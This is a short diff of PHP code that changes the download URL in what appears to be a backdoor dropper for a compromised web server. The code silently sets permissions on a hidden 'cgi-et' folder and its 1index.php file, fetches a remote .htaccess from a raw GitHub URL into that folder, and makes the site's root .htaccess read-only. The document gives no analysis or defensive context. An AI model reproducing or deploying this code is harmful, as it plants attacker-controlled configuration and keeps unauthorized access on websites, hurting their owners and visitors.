@@ -7,7 +7,7 @@ echo('Eec secra');
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et", 0755);
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/.htaccess", 0644);
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/cgi-et/1index.php", 0644);
-$filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
+$filee = sexx('https://raw.githubusercontent.com/Hrecc/Re/main/.htaccess');
 $locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
 if(file_put_contents($locall, $filee));  
 @chmod($_SERVER['DOCUMENT_ROOT'] . "/.htaccess", 0444);
